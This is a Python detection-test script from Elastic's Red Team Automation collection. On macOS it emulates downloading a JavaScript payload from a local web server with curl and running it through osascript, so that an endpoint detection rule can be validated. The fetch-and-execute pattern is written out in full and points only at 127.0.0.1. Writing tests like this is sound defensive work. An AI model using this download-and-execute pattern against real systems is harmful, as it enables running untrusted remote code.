# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import logging
from time import sleep

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="9332cece-38b7-49e1-9f8d-e879913ffdfb",
    name="javascript_payload",
    platforms=[OSType.MACOS],
    endpoint_rules=[
        RuleMetadata(id="871f0c30-a7c5-40a5-80e3-a50c6714632f", name="Download and Execution of JavaScript Payload")
    ],
    techniques=["T1059"],
)
def main():
    # Setup web server
    _ = _common.serve_dir_over_http()

    log.info("Executing commands to download and execute JavaScript payload")
    _ = _common.execute_command(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
    sleep(1)
    _ = _common.execute_command(["osascript", "-l", "JavaScript", "&"], shell=True)
